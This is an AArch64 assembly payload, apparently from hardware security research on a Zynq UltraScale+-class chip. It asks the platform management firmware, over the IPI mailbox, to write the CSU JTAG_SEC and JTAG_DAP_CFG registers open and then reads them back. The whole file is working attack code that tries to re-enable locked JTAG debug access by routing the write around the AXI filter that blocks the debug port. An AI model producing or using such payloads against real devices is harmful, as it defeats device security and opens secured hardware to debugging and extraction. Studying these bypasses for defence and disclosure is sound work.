// csu-pmu-mmio-write.S — A53 EL3 -> PMU PM_MMIO_WRITE of the debug gates.
//
// Tier-1 "PMU as the writer" unlock. csu-pmu-pm-probe.S established that the
// APU<->PMU0 IPI channel works (PM_GET_API_VERSION -> v1.1) and that PMU FW's
// pm_mmio_access.c allowlist governs PM_MMIO_READ. This payload issues the WRITE
// counterpart — PM_MMIO_WRITE (API 19) — asking the PMU to set CSU.JTAG_SEC and
// CSU.JTAG_DAP_CFG open on our behalf. The PMU runs above the master-aware AXI
// filter that blocks the DAP, so if the PM_MMIO write-allowlist permits these
// addresses the gates open even when the DAP-side write is filtered.
//
// HONEST EXPECTATION: the same allowlist that returns XST_PM_NO_ACCESS (0x7D2 =
// 2002) for secure-region READs likely also blocks these WRITEs — in which case
// this characterizes the PMU write-allowlist (a result, not a failure). On a
// firmware build that whitelists the CSU debug regs, it re-opens them.
//
// IPI map (from csu-pmu-pm-probe.S, validated):
//   Request  (APU->PMU): 0xFF9905C0   word[0]=API word[1..]=args
//   Response (PMU->APU): 0xFF9905E0   word[0]=status (0=XST_SUCCESS)
//   Doorbell: APU.TRIG (0xFF300000) PMU0 bit (bit16); poll APU.OBS bit16 -> CLEAR.
// PM_MMIO_WRITE args: word[1]=address, word[2]=mask, word[3]=value.
// PM_MMIO_READ  args: word[1]=address.
//
// OCM results layout (base 0xFFFE0000), 0x40 bytes per command:
//   +0x00..0x1F  response buffer (8 words from 0xFF9905E0; word0=status)
//   +0x20        diag: API ID sent
//   +0x24        diag: post-trigger APU.OBS (bit16 SET expected)
//   +0x28        diag: post-poll    APU.OBS (bit16 CLEAR = completed)
//   +0x2C        diag: poll iters used
//   +0x30        diag: arg1 (MMIO address)
//   +0x34        diag: arg2 (mask;  0 for reads)
//   +0x38        diag: arg3 (value; 0 for reads)
//   cmd i slot   = 0xFFFE0000 + i*0x40   (i = 0..3)
//
// Commands:
//   0 : PM_MMIO_WRITE  0xFFCA0038  mask 0x1FF  value 0x1FF   (JTAG_SEC open)
//   1 : PM_MMIO_READ   0xFFCA0038                            (read-back)
//   2 : PM_MMIO_WRITE  0xFFCA003C  mask 0xFF   value 0xFF    (JTAG_DAP_CFG open)
//   3 : PM_MMIO_READ   0xFFCA003C                            (read-back)
//
// Stage marker @ 0xFFFE7080 = command index in flight (0..4).
// Done marker  @ 0xFFFE7000 = 0xCAFEC0DE at end.

.equ STAGE_ADDR,        0xFFFE7080
.equ DONE_MARKER_ADDR,  0xFFFE7000
.equ DONE_MARKER_VAL,   0xCAFEC0DE

.equ RESULTS_BASE,      0xFFFE0000
.equ SLOT_STRIDE,       0x40

.equ APU_IPI_BASE,      0xFF300000
.equ OFF_TRIG,          0x00
.equ OFF_OBS,           0x04
.equ PMU0_BIT,          0x00010000

.equ REQ_BUFFER_ADDR,   0xFF9905C0
.equ RSP_BUFFER_ADDR,   0xFF9905E0

.equ PM_MMIO_WRITE,     19
.equ PM_MMIO_READ,      20

.section .text
.global _start

.macro load_addr reg, addr
    movz    \reg, #((\addr) & 0xFFFF)
    movk    \reg, #(((\addr) >> 16) & 0xFFFF), lsl #16
.endm

.macro load_imm reg, val
    movz    \reg, #((\val) & 0xFFFF)
    movk    \reg, #(((\val) >> 16) & 0xFFFF), lsl #16
.endm

// send_wcmd idx, api, a1, a2, a3 :
//   fills request buffer (API + 3 args), stamps diag (api @ +0x20, args @
//   +0x30/+0x34/+0x38), sets the stage marker, calls do_ipi, advances x19.
.macro send_wcmd idx, api, a1, a2, a3
    load_addr x21, REQ_BUFFER_ADDR
    load_imm  w2, \api
    str       w2, [x21, #0]
    str       w2, [x19, #0x20]
    load_imm  w2, \a1
    str       w2, [x21, #4]
    str       w2, [x19, #0x30]
    load_imm  w2, \a2
    str       w2, [x21, #8]
    str       w2, [x19, #0x34]
    load_imm  w2, \a3
    str       w2, [x21, #12]
    str       w2, [x19, #0x38]
    str       wzr, [x21, #16]
    str       wzr, [x21, #20]
    str       wzr, [x21, #24]
    str       wzr, [x21, #28]
    dsb       sy
    mov       w4, #\idx
    str       w4, [x5]
    bl        do_ipi
    add       x19, x19, #SLOT_STRIDE
.endm

_start:
    load_addr x5, STAGE_ADDR
    load_addr x6, DONE_MARKER_ADDR
    load_addr x19, RESULTS_BASE

    send_wcmd 0, PM_MMIO_WRITE, 0xFFCA0038, 0x1FF, 0x1FF
    send_wcmd 1, PM_MMIO_READ,  0xFFCA0038, 0,     0
    send_wcmd 2, PM_MMIO_WRITE, 0xFFCA003C, 0xFF,  0xFF
    send_wcmd 3, PM_MMIO_READ,  0xFFCA003C, 0,     0

    load_imm  w0, DONE_MARKER_VAL
    str       w0, [x6]
    dsb       sy
    mov       w4, #4
    str       w4, [x5]
    dsb       sy

spin:
    b       spin

// ------------------------------------------------------------------
// do_ipi — trigger one IPI, poll OBS-clear, copy response + diag to [x19].
//   in:  request already staged at REQ_BUFFER_ADDR; x19 = result slot.
//   clobbers: x1, w2, x4, w7, w8 (preserves x5/x6/x19/x21 and lr).
//   (identical to csu-pmu-pm-probe.S's do_ipi.)
// ------------------------------------------------------------------
do_ipi:
    load_addr x1, APU_IPI_BASE
    load_imm  w2, PMU0_BIT
    str       w2, [x1, #OFF_TRIG]
    dsb       sy

    ldr       w2, [x1, #OFF_OBS]
    str       w2, [x19, #0x24]          // post-trigger OBS
    dsb       sy

    load_imm  w7, 100000
    mov       w8, #0
1:  ldr       w2, [x1, #OFF_OBS]
    and       w2, w2, #PMU0_BIT
    cbz       w2, 2f                     // OBS bit16 cleared => PMU done
    add       w8, w8, #1
    subs      w7, w7, #1
    bne       1b
2:  ldr       w2, [x1, #OFF_OBS]
    str       w2, [x19, #0x28]          // post-poll OBS
    str       w8, [x19, #0x2C]          // iters used
    dsb       sy

    // copy 8 response words from RSP_BUFFER_ADDR to [x19, #0..0x1C]
    load_addr x4, RSP_BUFFER_ADDR
    ldr       w2, [x4, #0];  str w2, [x19, #0x00]
    ldr       w2, [x4, #4];  str w2, [x19, #0x04]
    ldr       w2, [x4, #8];  str w2, [x19, #0x08]
    ldr       w2, [x4, #12]; str w2, [x19, #0x0C]
    ldr       w2, [x4, #16]; str w2, [x19, #0x10]
    ldr       w2, [x4, #20]; str w2, [x19, #0x14]
    ldr       w2, [x4, #24]; str w2, [x19, #0x18]
    ldr       w2, [x4, #28]; str w2, [x19, #0x1C]
    dsb       sy
    ret
